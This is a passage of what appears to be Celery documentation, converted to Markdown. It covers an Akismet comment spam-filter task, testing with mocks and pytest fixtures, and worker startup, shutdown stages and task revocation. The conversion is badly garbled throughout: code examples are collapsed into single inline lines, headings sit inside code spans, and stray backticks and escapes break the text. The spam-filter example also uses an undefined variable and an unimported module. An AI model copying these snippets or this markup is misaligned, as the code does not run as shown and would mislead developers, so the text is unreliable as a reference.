To filter spam in comments I use [Akismet](http://akismet.com/faq/), the service `` ` used to filter spam in comments posted to the free blog platform `Wordpress`. `Akismet`_ is free for personal use, but for commercial use you need to pay. You have to sign up to their service to get an API key.  To make API calls to `Akismet`_ I use the `akismet.py`_ library written by `Michael Foord`_.  .. _task-example-blog-tasks: ``blog/tasks.py`-----------------`\`python from celery import Celery

> from akismet import Akismet
> 
> from django.core.exceptions import ImproperlyConfigured from django.contrib.sites.models import Site
> 
> from blog.models import Comment
> 
> app = Celery(broker='amqp://')
> 
> @app.task def spam\_filter(comment\_id, remote\_addr=None): logger = spam\_filter.get\_logger() logger.info('Running spam filter for comment %s', comment\_id)
> 
> > comment = Comment.objects.get(pk=comment\_id) current\_domain = Site.objects.get\_current().domain akismet = Akismet(settings.AKISMET\_KEY, '[http://{0}](http://%7B0%7D)'.format(domain)) if not akismet.verify\_key(): raise ImproperlyConfigured('Invalid AKISMET\_KEY')
> > 
> >   - is\_spam = akismet.comment\_check(user\_ip=remote\_addr,  
> >     comment\_content=comment.comment, comment\_author=comment.name, comment\_author\_email=comment.email\_address)
> > 
> >   - if is\_spam:  
> >     comment.is\_spam = True comment.save()
> > 
> > return is\_spam

\`\`\` .. \_\`akismet.py\`: <http://www.voidspace.org.uk/downloads/akismet.py> .. \_\`Michael Foord\`: <http://www.voidspace.org.uk/> .. \_\`exponential backoff\`: <https://en.wikipedia.org/wiki/Exponential_backoff> .. \_\`jitter\`: <https://en.wikipedia.org/wiki/Jitter> .. \_\`Pydantic\`: <https://docs.pydantic.dev/>

<div id="citations">

  - <span id="AOC1" class="citation-label">AOC1</span>  
    Breshears, Clay. Section 2.2.1, "The Art of Concurrency". O'Reilly Media, Inc. May 15, 2009. ISBN-13 978-0-596-52153-0.

</div>

---

testing.md

---

# Testing with Celery

Testing with Celery is divided into two parts:

>   - Unit & Integration: Using `celery.contrib.pytest`.
>   - Smoke / Production: Using `pytest-celery <pytest-celery>` \>= 1.0.0

Installing the pytest-celery plugin will install the `celery.contrib.pytest` infrastructure as well, alongside the pytest plugin infrastructure. The difference is how you use it.

\> **Warning** \> Both APIs are NOT compatible with each other. The pytest-celery plugin is Docker based and the `celery.contrib.pytest` is mock based.

To use the `celery.contrib.pytest` infrastructure, follow the instructions below.

The pytest-celery plugin has its [own documentation](https://pytest-celery.readthedocs.io/).

## Tasks and unit tests

To test task behavior in unit tests the preferred method is mocking.

<div class="admonition">

Eager mode

The eager mode enabled by the `task_always_eager` setting is by definition not suitable for unit tests.

When testing with eager mode you are only testing an emulation of what happens in a worker, and there are many discrepancies between the emulation and what happens in reality.

Note that eagerly executed tasks don't write results to backend by default. If you want to enable this functionality, have a look at `task_store_eager_result`.

</div>

A Celery task is much like a web view, in that it should only define how to perform the action in the context of being called as a task.

This means optimally tasks only handle things like serialization, message headers, retries, and so on, with the actual logic implemented elsewhere.

Say we had a task like this:

`` `python     from .models import Product       @app.task(bind=True)     def send_order(self, product_pk, quantity, price):         price = Decimal(price)  # json serializes this to string.          # models are passed by id, not serialized.         product = Product.objects.get(product_pk)          try:             product.order(quantity, price)         except OperationalError as exc:             raise self.retry(exc=exc) ``Note``: A task being `bound <https://docs.celeryq.dev/en/latest/userguide/tasks.html#bound-tasks>`_ means the first``\` argument to the task will always be the task instance (self). which means you do get a self argument as the first argument and can use the Task class methods and attributes.

You could write unit tests for this task, using mocking like in this example:

`` `python     from pytest import raises      from celery.exceptions import Retry      # for python 2: use mock.patch from `pip install mock`.     from unittest.mock import patch      from proj.models import Product     from proj.tasks import send_order      class test_send_order:          @patch('proj.tasks.Product.order')  # < patching Product in module above         def test_success(self, product_order):             product = Product.objects.create(                 name='Foo',             )             send_order(product.pk, 3, Decimal(30.3))             product_order.assert_called_with(3, Decimal(30.3))          @patch('proj.tasks.Product.order')         @patch('proj.tasks.send_order.retry')         def test_failure(self, send_order_retry, product_order):             product = Product.objects.create(                 name='Foo',             )              # Set a side effect on the patched methods             # so that they raise the errors we want.             send_order_retry.side_effect = Retry()             product_order.side_effect = OperationalError()              with raises(Retry):                 send_order(product.pk, 3, Decimal(30.6))  .. _pytest_plugin:  pytest ``\` ======

<div class="versionadded">

4.0

</div>

Celery also makes a `pytest` plugin available that adds fixtures that you can use in your integration (or unit) test suites.

### Enabling

Celery initially ships the plugin in a disabled state, to enable it you can either:

>   - `pip install celery[pytest]`
>   - `pip install pytest-celery`
>   - or add an environment variable `PYTEST_PLUGINS=celery.contrib.pytest`
>   - or add `pytest_plugins = ("celery.contrib.pytest", )` to your root conftest.py

### Marks

#### `celery` - Set test app configuration.

The `celery` mark enables you to override the configuration used for a single test case:

`` `python     @pytest.mark.celery(result_backend='redis://')     def test_something():         ...   or for all the test cases in a class:  .. code-block:: python      @pytest.mark.celery(result_backend='redis://')     class test_something:          def test_one(self):             ...          def test_two(self):             ...  Fixtures ``\` --------

#### Function scope

##### `celery_app` - Celery app used for testing.

This fixture returns a Celery app you can use for testing.

Example:

`` `python     def test_create_task(celery_app, celery_worker):         @celery_app.task         def mul(x, y):             return x * y          celery_worker.reload()         assert mul.delay(4, 4).get(timeout=10) == 16 ``celery\_worker`- Embed live worker.`\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

This fixture starts a Celery worker instance that you can use for integration tests. The worker will be started in a *separate thread* and will be shutdown as soon as the test returns.

By default the fixture will wait up to 10 seconds for the worker to complete outstanding tasks and will raise an exception if the time limit is exceeded. The timeout can be customized by setting the `shutdown_timeout` key in the dictionary returned by the <span class="title-ref">celery\_worker\_parameters</span> fixture.

Example:

`` `python     # Put this in your conftest.py     @pytest.fixture(scope='session')     def celery_config():         return {             'broker_url': 'amqp://',             'result_backend': 'redis://'         }      def test_add(celery_worker):         mytask.delay()       # If you wish to override some setting in one test cases     # only - you can use the ``celery`mark:     @pytest.mark.celery(result_backend='rpc')     def test_other(celery_worker):         ...  Heartbeats are disabled by default which means that the test worker doesn't`<span class="title-ref"> send events for </span><span class="title-ref">worker-online</span><span class="title-ref">, </span><span class="title-ref">worker-offline</span><span class="title-ref"> and </span><span class="title-ref">worker-heartbeat</span><span class="title-ref">. To enable heartbeats modify the \`celery\_worker\_parameters</span> fixture:

`` `python     # Put this in your conftest.py     @pytest.fixture(scope="session")     def celery_worker_parameters():         return {"without_heartbeat": False}         ...    Session scope ``\` ^^^^^^^^^^^^^

##### `celery_config` - Override to setup Celery test app configuration.

You can redefine this fixture to configure the test Celery app.

The config returned by your fixture will then be used to configure the <span class="title-ref">celery\_app</span>, and <span class="title-ref">celery\_session\_app</span> fixtures.

Example:

`` `python     @pytest.fixture(scope='session')     def celery_config():         return {             'broker_url': 'amqp://',             'result_backend': 'rpc',         } ``celery\_parameters`- Override to setup Celery test app parameters.`\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

You can redefine this fixture to change the `__init__` parameters of test Celery app. In contrast to <span class="title-ref">celery\_config</span>, these are directly passed to when instantiating <span class="title-ref">\~celery.Celery</span>.

The config returned by your fixture will then be used to configure the <span class="title-ref">celery\_app</span>, and <span class="title-ref">celery\_session\_app</span> fixtures.

Example:

`` `python     @pytest.fixture(scope='session')     def celery_parameters():         return {             'task_cls':  my.package.MyCustomTaskClass,             'strict_typing': False,         } ``celery\_worker\_parameters`- Override to setup Celery worker parameters.`\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

You can redefine this fixture to change the `__init__` parameters of test Celery workers. These are directly passed to <span class="title-ref">\~celery.worker.WorkController</span> when it is instantiated.

The config returned by your fixture will then be used to configure the <span class="title-ref">celery\_worker</span>, and <span class="title-ref">celery\_session\_worker</span> fixtures.

Example:

`` `python     @pytest.fixture(scope='session')     def celery_worker_parameters():         return {             'queues':  ('high-prio', 'low-prio'),             'exclude_queues': ('celery'),         } ``celery\_enable\_logging`- Override to enable logging in embedded workers.`\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

This is a fixture you can override to enable logging in embedded workers.

Example:

`` `python     @pytest.fixture(scope='session')     def celery_enable_logging():         return True ``celery\_includes`- Add additional imports for embedded workers.`\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~ You can override fixture to include modules when an embedded worker starts.

You can have this return a list of module names to import, which can be task modules, modules registering signals, and so on.

Example:

`` `python     @pytest.fixture(scope='session')     def celery_includes():         return [             'proj.tests.tasks',             'proj.tests.celery_signal_handlers',         ] ``celery\_worker\_pool`- Override the pool used for embedded workers.`\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~ You can override fixture to configure the execution pool used for embedded workers.

Example:

`` `python     @pytest.fixture(scope='session')     def celery_worker_pool():         return 'prefork'  > **Warning** >      You cannot use the gevent/eventlet pools, that is unless your whole test     suite is running with the monkeypatches enabled. ``celery\_session\_worker`- Embedded worker that lives throughout the session.`\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

This fixture starts a worker that lives throughout the testing session (it won't be started/stopped for every test).

Example:

`` `python     # Add this to your conftest.py     @pytest.fixture(scope='session')     def celery_config():         return {             'broker_url': 'amqp://',             'result_backend': 'rpc',         }      # Do this in your tests.     def test_add_task(celery_session_worker):         assert add.delay(2, 2).get() == 4  > **Warning** >      It's probably a bad idea to mix session and ephemeral workers... ``celery\_session\_app`- Celery app used for testing (session scope).`\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

This can be used by other session scoped fixtures when they need to refer to a Celery app instance.

##### `use_celery_app_trap` - Raise exception on falling back to default app.

This is a fixture you can override in your `conftest.py`, to enable the "app trap": if something tries to access the default or current\_app, an exception is raised.

Example:

`` `python     @pytest.fixture(scope='session')     def use_celery_app_trap():         return True   If a test wants to access the default app, you would have to mark it using ``<span class="title-ref"> the </span><span class="title-ref">depends\_on\_current\_app</span>\` fixture:

`` `python @pytest.mark.usefixtures('depends_on_current_app') def test_something():     something() ``\`

---

workers.md

---

# Workers Guide

<div class="contents" data-local="" data-depth="1">

</div>

## Starting the worker

<div class="sidebar">

**Daemonizing**

You probably want to use a daemonization tool to start the worker in the background. See \[daemonizing\](\#daemonizing) for help starting the worker as a daemon using popular service managers.

</div>

You can start the worker in the foreground by executing the command:

`` `console     $ celery -A proj worker -l INFO  For a full list of available command-line options see ``<span class="title-ref"> :mod:</span>\~celery.bin.worker\`, or simply do:

`` `console     $ celery worker --help  You can start multiple workers on the same machine, but ``<span class="title-ref"> be sure to name each individual worker by specifying a node name with the :option:</span>--hostname \<celery worker --hostname\>\` argument:

`` `console     $ celery -A proj worker --loglevel=INFO --concurrency=10 -n worker1@%h     $ celery -A proj worker --loglevel=INFO --concurrency=10 -n worker2@%h     $ celery -A proj worker --loglevel=INFO --concurrency=10 -n worker3@%h  The ``hostname`argument can expand the following variables:      -`%h`:  Hostname, including domain name.     -`%n`:  Hostname only.     -`%d`:  Domain name only.  If the current hostname is *george.example.com*, these will expand to:  +----------+----------------+------------------------------+`<span class="title-ref"> | Variable | Template | Result | +----------+----------------+------------------------------+ | </span><span class="title-ref">%h</span><span class="title-ref"> | </span><span class="title-ref">worker1@%h</span><span class="title-ref"> | \*worker1@george.example.com\* | +----------+----------------+------------------------------+ | </span><span class="title-ref">%n</span><span class="title-ref"> | </span><span class="title-ref">worker1@%n</span><span class="title-ref"> | \*worker1@george\* | +----------+----------------+------------------------------+ | </span><span class="title-ref">%d</span><span class="title-ref"> | </span><span class="title-ref">worker1@%d</span>\` | *worker1@example.com* | +----------+----------------+------------------------------+

<div class="admonition">

Note for `supervisor` users

The `%` sign must be escaped by adding a second one: <span class="title-ref">%%h</span>.

</div>

## Stopping the worker

Shutdown should be accomplished using the `TERM` signal.

When shutdown is initiated the worker will finish all currently executing tasks before it actually terminates. If these tasks are important, you should wait for it to finish before doing anything drastic, like sending the `KILL` signal.

If the worker won't shutdown after considerate time, for being stuck in an infinite-loop or similar, you can use the `KILL` signal to force terminate the worker: but be aware that currently executing tasks will be lost (i.e., unless the tasks have the <span class="title-ref">\~@Task.acks\_late</span> option set).

Also as processes can't override the `KILL` signal, the worker will not be able to reap its children; make sure to do so manually. This command usually does the trick:

`` `console     $ pkill -9 -f 'celery worker'  If you don't have the :command:`pkill` command on your system, you can use the slightly ``\` longer version:

`` `console     $ ps auxww | awk '/celery worker/ {print $2}' | xargs kill -9  .. versionchanged:: 5.2     On Linux systems, Celery now supports sending :sig:`KILL` signal to all child processes     after worker termination. This is done via `PR_SET_PDEATHSIG` option of ``prctl(2)`.  .. _worker_shutdown:  Worker Shutdown`\` ---------------

We will use the terms *Warm, Soft, Cold, Hard* to describe the different stages of worker shutdown. The worker will initiate the shutdown process when it receives the `TERM` or `QUIT` signal. The `INT` (Ctrl-C) signal is also handled during the shutdown process and always triggers the next stage of the shutdown process.

### Warm Shutdown

When the worker receives the `TERM` signal, it will initiate a warm shutdown. The worker will finish all currently executing tasks before it actually terminates. The first time the worker receives the `INT` (Ctrl-C) signal, it will initiate a warm shutdown as well.

The warm shutdown will stop the call to <span class="title-ref">WorkController.start() \<celery.worker.worker.WorkController.start\></span> and will call <span class="title-ref">WorkController.stop() \<celery.worker.worker.WorkController.stop\></span>.

  - Additional `TERM` signals will be ignored during the warm shutdown process.
  - The next `INT` signal will trigger the next stage of the shutdown process.

### Cold Shutdown

Cold shutdown is initiated when the worker receives the `QUIT` signal. The worker will stop all currently executing tasks and terminate immediately.

<div id="worker-REMAP_SIGTERM">

\> **Note** \> If the environment variable `REMAP_SIGTERM` is set to `SIGQUIT`, the worker will also initiate a cold shutdown when it receives the `TERM` signal instead of a warm shutdown.

</div>

The cold shutdown will stop the call to <span class="title-ref">WorkController.start() \<celery.worker.worker.WorkController.start\></span> and will call <span class="title-ref">WorkController.terminate() \<celery.worker.worker.WorkController.terminate\></span>.

If the warm shutdown already started, the transition to cold shutdown will run a signal handler `on_cold_shutdown` to cancel all currently executing tasks from the MainProcess and potentially trigger the \[worker-soft-shutdown\](\#worker-soft-shutdown).

### Soft Shutdown

<div class="versionadded">

5.5

</div>

Soft shutdown is a time limited warm shutdown, initiated just before the cold shutdown. The worker will allow `worker_soft_shutdown_timeout` seconds for all currently executing tasks to finish before it terminates. If the time limit is reached, the worker will initiate a cold shutdown and cancel all currently executing tasks. If the `QUIT` signal is received during the soft shutdown, the worker will cancel all currently executing tasks but still wait for the time limit to finish before terminating, giving a chance for the worker to perform the cold shutdown a little more gracefully.

The soft shutdown is disabled by default to maintain backward compatibility with the \[worker-cold-shutdown\](\#worker-cold-shutdown) behavior. To enable the soft shutdown, set `worker_soft_shutdown_timeout` to a positive float value. The soft shutdown will be skipped if there are no tasks running. To force the soft shutdown, *also* enable the `worker_enable_soft_shutdown_on_idle` setting.

\> **Warning** \> If the worker is not running any task but has ETA tasks reserved, the soft shutdown will not be initiated unless the `worker_enable_soft_shutdown_on_idle` setting is enabled, which may lead to task loss during the cold shutdown. When using ETA tasks, it is recommended to enable the soft shutdown on idle. Experiment which `worker_soft_shutdown_timeout` value works best for your setup to reduce the risk of task loss to a minimum.

For example, when setting `worker_soft_shutdown_timeout=3`, the worker will allow 3 seconds for all currently executing tasks to finish before it terminates. If the time limit is reached, the worker will initiate a cold shutdown and cancel all currently executing tasks.

`` `console     [INFO/MainProcess] Task myapp.long_running_task[6f748357-b2c7-456a-95de-f05c00504042] received     [WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 1/2000s     [WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 2/2000s     [WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 3/2000s     ^C     worker: Hitting Ctrl+C again will initiate cold shutdown, terminating all running tasks!      worker: Warm shutdown (MainProcess)     [WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 4/2000s     [WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 5/2000s     [WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 6/2000s     ^C     worker: Hitting Ctrl+C again will terminate all running tasks!     [WARNING/MainProcess] Initiating Soft Shutdown, terminating in 3 seconds     [WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 7/2000s     [WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 8/2000s     [WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 9/2000s     [WARNING/MainProcess] Restoring 1 unacknowledged message(s)  - The next :sig:`QUIT` signal will cancel the tasks that are still running in the soft shutdown, but the worker   will still wait for the time limit to finish before terminating. ``<span class="title-ref"> - The next (2nd) :sig:\`QUIT</span> or `INT` signal will trigger the next stage of the shutdown process.

### Hard Shutdown

<div class="versionadded">

5.5

</div>

Hard shutdown is mostly for local or debug purposes, allowing to spam the `INT` (Ctrl-C) signal to force the worker to terminate immediately. The worker will stop all currently executing tasks and terminate immediately by raising a <span class="title-ref">@WorkerTerminate</span> exception in the MainProcess.

For example, notice the `^C` in the logs below (using the `INT` signal to move from stage to stage):

`` `console     [INFO/MainProcess] Task myapp.long_running_task[7235ac16-543d-4fd5-a9e1-2d2bb8ab630a] received     [WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 1/2000s     [WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 2/2000s     ^C     worker: Hitting Ctrl+C again will initiate cold shutdown, terminating all running tasks!      worker: Warm shutdown (MainProcess)     [WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 3/2000s     [WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 4/2000s     ^C     worker: Hitting Ctrl+C again will terminate all running tasks!     [WARNING/MainProcess] Initiating Soft Shutdown, terminating in 10 seconds     [WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 5/2000s     [WARNING/ForkPoolWorker-8] long_running_task is running, sleeping 6/2000s     ^C     Waiting gracefully for cold shutdown to complete...      worker: Cold shutdown (MainProcess)     ^C[WARNING/MainProcess] Restoring 1 unacknowledged message(s)  > **Warning** >      The log ``Restoring 1 unacknowledged message(s)`is misleading as it is not guaranteed that the message     will be restored after a hard shutdown. The [worker-soft-shutdown](#worker-soft-shutdown) allows adding a time window just between     the warm and the cold shutdown that improves the gracefulness of the shutdown process.  .. _worker-restarting:  Restarting the worker`\` =====================

To restart the worker you should send the <span class="title-ref">TERM</span> signal and start a new instance. The easiest way to manage workers for development is by using \`celery multi\`:

`` `console     $ celery multi start 1 -A proj -l INFO -c4 --pidfile=/var/run/celery/%n.pid     $ celery multi restart 1 --pidfile=/var/run/celery/%n.pid  For production deployments you should be using init-scripts or a process ``\` supervision system (see \[daemonizing\](\#daemonizing)).

Other than stopping, then starting the worker to restart, you can also restart the worker using the `HUP` signal. Note that the worker will be responsible for restarting itself so this is prone to problems and isn't recommended in production:

`` `console     $ kill -HUP $pid  > **Note** >      Restarting by :sig:`HUP` only works if the worker is running     in the background as a daemon (it doesn't have a controlling     terminal).      :sig:`HUP` is disabled on macOS because of a limitation on     that platform.  Automatic re-connection on connection loss to broker ``\` ====================================================

<div class="versionadded">

5.3

</div>

Unless `broker_connection_retry_on_startup` is set to False, Celery will automatically retry reconnecting to the broker after the first connection loss. `broker_connection_retry` controls whether to automatically retry reconnecting to the broker for subsequent reconnects.

<div class="versionadded">

5.1

</div>

If `worker_cancel_long_running_tasks_on_connection_loss` is set to True, Celery will also cancel any long running task that is currently running.

<div class="versionadded">

5.3

</div>

Since the message broker does not track how many tasks were already fetched before the connection was lost, Celery will reduce the prefetch count by the number of tasks that are currently running multiplied by `worker_prefetch_multiplier`. The prefetch count will be gradually restored to the maximum allowed after each time a task that was running before the connection was lost is complete.

This feature is enabled by default, but can be disabled by setting False to `worker_enable_prefetch_count_reduction`.

## Process Signals

The worker's main process overrides the following signals:

|        |                                            |
| ------ | ------------------------------------------ |
| `TERM` | Warm shutdown, wait for tasks to complete. |
| `QUIT` | Cold shutdown, terminate ASAP              |
| `USR1` | Dump traceback for all active threads.     |
| `USR2` | Remote debug, see `celery.contrib.rdb`.    |

## Variables in file paths

The file path arguments for `--logfile <celery worker --logfile>`, `--pidfile <celery worker --pidfile>`, and `--statedb <celery worker --statedb>` can contain variables that the worker will expand:

#### Node name replacements

  - `%p`: Full node name.
  - `%h`: Hostname, including domain name.
  - `%n`: Hostname only.
  - `%d`: Domain name only.
  - `%i`: Prefork pool process index or 0 if MainProcess.
  - `%I`: Prefork pool process index with separator.

For example, if the current hostname is `george@foo.example.com` then these will expand to:

  - `--logfile=%p.log` -\> `george@foo.example.com.log`
  - `--logfile=%h.log` -\> `foo.example.com.log`
  - `--logfile=%n.log` -\> `george.log`
  - `--logfile=%d.log` -\> `example.com.log`

#### Prefork pool process index

The prefork pool process index specifiers will expand into a different filename depending on the process that'll eventually need to open the file.

This can be used to specify one log file per child process.

Note that the numbers will stay within the process limit even if processes exit or if autoscale/`maxtasksperchild`/time limits are used. That is, the number is the *process index* not the process count or pid.

  - `%i` - Pool process index or 0 if MainProcess.
    
    > Where `-n worker1@example.com -c2 -f %n-%i.log` will result in three log files:
    > 
    > >   - `worker1-0.log` (main process)
    > >   - `worker1-1.log` (pool process 1)
    > >   - `worker1-2.log` (pool process 2)

  - `%I` - Pool process index with separator.
    
    > Where `-n worker1@example.com -c2 -f %n%I.log` will result in three log files:
    > 
    > >   - `worker1.log` (main process)
    > >   - `worker1-1.log` (pool process 1)
    > >   - `worker1-2.log` (pool process 2)

## Concurrency

By default multiprocessing is used to perform concurrent execution of tasks, but you can also use \[Eventlet \<concurrency-eventlet\>\](\#eventlet-\<concurrency-eventlet\>). The number of worker processes/threads can be changed using the `--concurrency <celery worker --concurrency>` argument and defaults to the number of CPUs available on the machine.

<div class="admonition">

Number of processes (multiprocessing/prefork pool)

More pool processes are usually better, but there's a cut-off point where adding more pool processes affects performance in negative ways. There's even some evidence to support that having multiple worker instances running, may perform better than having a single worker. For example 3 workers with 10 pool processes each. You need to experiment to find the numbers that works best for you, as this varies based on application, work load, task run times and other factors.

</div>

## Remote control

<div class="versionadded">

2.0

</div>

<div class="sidebar">

**The `celery` command**

The `celery` program is used to execute remote control commands from the command-line. It supports all of the commands listed below. See \[monitoring-control\](\#monitoring-control) for more information.

</div>

  - pool support  
    *prefork, eventlet, gevent, thread*, blocking:*solo* (see note)

  - broker support  
    *amqp, redis*

Workers have the ability to be remote controlled using a high-priority broadcast message queue. The commands can be directed to all, or a specific list of workers.

Commands can also have replies. The client can then wait for and collect those replies. Since there's no central authority to know how many workers are available in the cluster, there's also no way to estimate how many workers may send a reply, so the client has a configurable timeout — the deadline in seconds for replies to arrive in. This timeout defaults to one second. If the worker doesn't reply within the deadline it doesn't necessarily mean the worker didn't reply, or worse is dead, but may simply be caused by network latency or the worker being slow at processing commands, so adjust the timeout accordingly.

In addition to timeouts, the client can specify the maximum number of replies to wait for. If a destination is specified, this limit is set to the number of destination hosts.

\> **Note** \> The `solo` pool supports remote control commands, but any task executing will block any waiting control command, so it is of limited use if the worker is very busy. In that case you must increase the timeout waiting for replies in the client.

#### The <span class="title-ref">\~@control.broadcast</span> function

This is the client function used to send commands to the workers. Some remote control commands also have higher-level interfaces using <span class="title-ref">\~@control.broadcast</span> in the background, like <span class="title-ref">\~@control.rate\_limit</span>, and <span class="title-ref">\~@control.ping</span>.

Sending the `rate_limit` command and keyword arguments:

`` `pycon     >>> app.control.broadcast('rate_limit',     ...                          arguments={'task_name': 'myapp.mytask',     ...                                     'rate_limit': '200/m'})  This will send the command asynchronously, without waiting for a reply. ``<span class="title-ref"> To request a reply you have to use the \`reply</span> argument:

`` `pycon     >>> app.control.broadcast('rate_limit', {     ...     'task_name': 'myapp.mytask', 'rate_limit': '200/m'}, reply=True)     [{'worker1.example.com': 'New rate limit set successfully'},      {'worker2.example.com': 'New rate limit set successfully'},      {'worker3.example.com': 'New rate limit set successfully'}]  Using the `destination` argument you can specify a list of workers ``\` to receive the command:

`` `pycon     >>> app.control.broadcast('rate_limit', {     ...     'task_name': 'myapp.mytask',     ...     'rate_limit': '200/m'}, reply=True,     ...                             destination=['worker1@example.com'])     [{'worker1.example.com': 'New rate limit set successfully'}]   Of course, using the higher-level interface to set rate limits is much ``<span class="title-ref"> more convenient, but there are commands that can only be requested using </span>\~@control.broadcast\`.

## Commands

<div class="control">

revoke

</div>

#### `revoke`: Revoking tasks

  - pool support  
    all, terminate only supported by prefork, eventlet and gevent

  - broker support  
    *amqp, redis*

  - command  
    `celery -A proj control revoke <task_id>`

All worker nodes keeps a memory of revoked task ids, either in-memory or persistent on disk (see \[worker-persistent-revokes\](\#worker-persistent-revokes)).

\> **Note** \> The maximum number of revoked tasks to keep in memory can be specified using the `CELERY_WORKER_REVOKES_MAX` environment variable, which defaults to 50000. When the limit has been exceeded, the revokes will be active for 10800 seconds (3 hours) before being expired. This value can be changed using the `CELERY_WORKER_REVOKE_EXPIRES` environment variable.

> Memory limits can also be set for successful tasks through the `CELERY_WORKER_SUCCESSFUL_MAX` and `CELERY_WORKER_SUCCESSFUL_EXPIRES` environment variables, and default to 1000 and 10800 respectively.

When a worker receives a revoke request it will skip executing the task, but it won't terminate an already executing task unless the <span class="title-ref">terminate</span> option is set.

\> **Note** \> The terminate option is a last resort for administrators when a task is stuck. It's not for terminating the task, it's for terminating the process that's executing the task, and that process may have already started processing another task at the point when the signal is sent, so for this reason you must never call this programmatically.

If <span class="title-ref">terminate</span> is set the worker child process processing the task will be terminated. The default signal sent is <span class="title-ref">TERM</span>, but you can specify this using the <span class="title-ref">signal</span> argument. Signal can be the uppercase name of any signal defined in the `signal` module in the Python Standard Library.

Terminating a task also revokes it.

**Example**

`` `pycon     >>> result.revoke()      >>> AsyncResult(id).revoke()      >>> app.control.revoke('d9078da5-9915-40a0-bfa1-392c7bde42ed')      >>> app.control.revoke('d9078da5-9915-40a0-bfa1-392c7bde42ed',     ...                    terminate=True)      >>> app.control.revoke('d9078da5-9915-40a0-bfa1-392c7bde42ed',     ...                    terminate=True, signal='SIGKILL')     Revoking multiple tasks ``\` -----------------------

<div class="versionadded">

3.1

</div>

The revoke method also accepts a list argument, where it will revoke several tasks at once.

**Example**

`` `pycon     >>> app.control.revoke([     ...    '7993b0aa-1f0b-4780-9af0-c47c0858b3f2',     ...    'f565793e-b041-4b2b-9ca4-dca22762a55d',     ...    'd9d35e03-2997-42d0-a13e-64a66b88a618',     ])   The ``GroupResult.revoke`method takes advantage of this since`\` version 3.1.

#### Persistent revokes

Revoking tasks works by sending a broadcast message to all the workers, the workers then keep a list of revoked tasks in memory. When a worker starts up it will synchronize revoked tasks with other workers in the cluster.

The list of revoked tasks is in-memory so if all workers restart the list of revoked ids will also vanish. If you want to preserve this list between restarts you need to specify a file for these to be stored in by using the <span class="title-ref">--statedb</span> argument to `celery worker`:

`` `console     $ celery -A proj worker -l INFO --statedb=/var/run/celery/worker.state  or if you use :program:`celery multi` you want to create one file per ``<span class="title-ref"> worker instance so use the </span>%n\` format to expand the current node name:

`` `console     celery multi start 2 -l INFO --statedb=/var/run/celery/%n.state   See also [worker-files](#worker-files)  Note that remote control commands must be working for revokes to work. ``\` Remote control commands are only supported by the RabbitMQ (amqp) and Redis at this point.

<div class="control">

revoke\_by\_stamped\_header

</div>

#### `revoke_by_stamped_header`: Revoking tasks by their stamped headers

  - pool support  
    all, terminate only supported by prefork and eventlet

  - broker support  
    *amqp, redis*

  - command  
    `celery -A proj control revoke_by_stamped_header <header=value>`

This command is similar to <span class="title-ref">\~@control.revoke</span>, but instead of specifying the task id(s), you specify the stamped header(s) as key-value pair(s), and each task that has a stamped header matching the key-value pair(s) will be revoked.

\> **Warning** \> The revoked headers mapping is not persistent across restarts, so if you restart the workers, the revoked headers will be lost and need to be mapped again.

<div class="warning">

<div class="title">

Warning

</div>

This command may perform poorly if your worker pool concurrency is high and terminate is enabled, since it will have to iterate over all the running tasks to find the ones with the specified stamped header.

</div>

**Example**

`` `pycon     >>> app.control.revoke_by_stamped_header({'header': 'value'})      >>> app.control.revoke_by_stamped_header({'header': 'value'}, terminate=True)      >>> app.control.revoke_by_stamped_header({'header': 'value'}, terminate=True, signal='SIGKILL')   Revoking multiple tasks by stamped headers ``\` ------------------------------------------

<div class="versionadded">

5.3

</div>

The `revoke_by_stamped_header` method also accepts a list argument, where it will revoke by several headers or several values.

**Example**

